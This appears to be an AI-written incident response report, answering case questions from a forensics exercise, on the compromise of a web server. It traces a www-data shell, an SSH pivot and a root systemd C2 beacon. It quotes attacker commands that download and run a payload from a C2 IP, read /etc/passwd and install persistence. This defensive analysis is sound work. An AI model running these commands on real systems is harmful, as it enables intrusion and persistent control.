All claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised. An attacker initially gained a shell as the **www-data** service account (likely via a web application vulnerability), performed reconnaissance, and downloaded a payload from the C2 server at **185.229.59.103**. The attacker then pivoted to the **deploy** account via SSH (using a stolen or reused key) from the same C2 IP, exploited deploy's NOPASSWD sudo access to `systemctl`, and installed a persistent C2 beacon as a systemd service running as root. The attacker's commands were not recorded in deploy's bash history, indicating anti-forensic measures.

## Attack Timeline

| Time (Apr 2026) | Event | Source |
|---|---|---|
| *Unknown (pre-log)* | Attacker gains shell as www-data, runs recon (`id`, `uname -a`), downloads payload from `http://185.229.59.103/u` to `/tmp/.u`, executes it | `fs/var/www/.bash_history:1-7` |
| Apr 14, 03:17:44 | Attacker SSH login as **deploy** from **185.229.59.103** via publickey (same key fingerprint as legitimate CI runner) | `auth.log:30` |
| Apr 14, 03:18:02 | `sudo cat /etc/passwd` — credential/config reconnaissance | `auth.log:32` |
| Apr 14, 03:18:12 | `sudo cp /tmp/update /usr/local/bin/update` — staged payload | `auth.log:35` |
| Apr 14, 03:18:17 | `sudo chmod +x /usr/local/bin/update` | `auth.log:36` |
| Apr 14, 03:18:29 | `sudo tee /etc/systemd/system/system-updater.service` — created C2 beacon unit | `auth.log:37` |
| Apr 14, 03:18:44 | `sudo systemctl daemon-reload` | `auth.log:38` |
| Apr 14, 03:18:58 | `sudo systemctl enable system-updater.service` — persistence | `auth.log:39` |
| Apr 14, 03:19:03 | `sudo systemctl start system-updater.service` — beacon active | `auth.log:40` |
| Apr 14, 03:20:51 | Attacker session closed | `auth.log:41` |

## Confirmed Findings

1. **C2 Beacon Persistence (systemd)** — A malicious systemd unit `system-updater.service` was installed at `etc/systemd/system/system-updater.service`. It runs as root and POSTs hostname and IP to `https://185.229.59.103:8443/beacon` every 600 seconds.

2. **Attacker Sudo Activity** — The deploy user created the service file via `sudo tee`, reloaded systemd, and enabled/started the service, all recorded in auth.log lines 32–40.

3. **Dangerous Sudo Configuration** — `etc/sudoers.d/deploy` grants deploy NOPASSWD access to `/usr/bin/systemctl`, which the attacker leveraged to install and enable the C2 service without any password challenge.

4. **Initial Compromise via www-data** — The www-data account's bash history (`fs/var/www/.bash_history:1-7`) shows classic post-exploitation: `id`, `uname -a`, `wget http://185.229.59.103/u -O /tmp/.u`, `chmod +x /tmp/.u`, `/tmp/.u &`, `cat /etc/passwd`.

5. **Attacker SSH Login** — On Apr 14 03:17:44, the deploy account was accessed from **185.229.59.103** (confirmed C2 IP, tagged `c2_server` with high confidence). The same RSA key fingerprint was used as the legitimate CI runner key, suggesting key theft.

## Inferences

6. **History Tampering** — Deploy's `.bash_history` contains only 15 routine CI/CD commands and none of the 9 malicious sudo commands from auth.log. The attacker either set `HISTFILE=/dev/null` or cleaned the history post-compromise.

## IOC Summary

| Type | Value | Verdict |
|---|---|---|
| IP | **185.229.59.103** | C2 server (high confidence) |
| URL | `http://185.229.59.103/u` | Payload delivery |
| URL | `https://185.229.59.103:8443/beacon` | C2 beacon endpoint |
| File | `/tmp/.u` (hidden dot-file) | Downloaded payload |
| File | `/usr/local/bin/update` | Staged binary (copied from `/tmp/update`) |
| Systemd unit | `system-updater.service` | Persistence mechanism |

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root** (4 commands, benign admin tasks), **deploy** (15 commands, routine CI/CD — git, npm, docker), **alice** (6 commands, benign log tailing), and **www-data** (7 commands, malicious attacker activity). **Bob** had no shell history file present in the filesystem snapshot.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) clearly shows what the attacker did: system reconnaissance (`id`, `uname -a`), downloading a payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), making it executable (`chmod +x /tmp/.u`), running it in the background (`/tmp/.u &`), and reading `/etc/passwd`. Additionally, the **deploy** account's **sudo log** in auth.log (lines 32–40) shows the attacker's privilege-escalation and persistence actions (reading `/etc/passwd`, staging a binary, creating and enabling the C2 beacon systemd service), even though these commands were deliberately excluded from deploy's bash history file.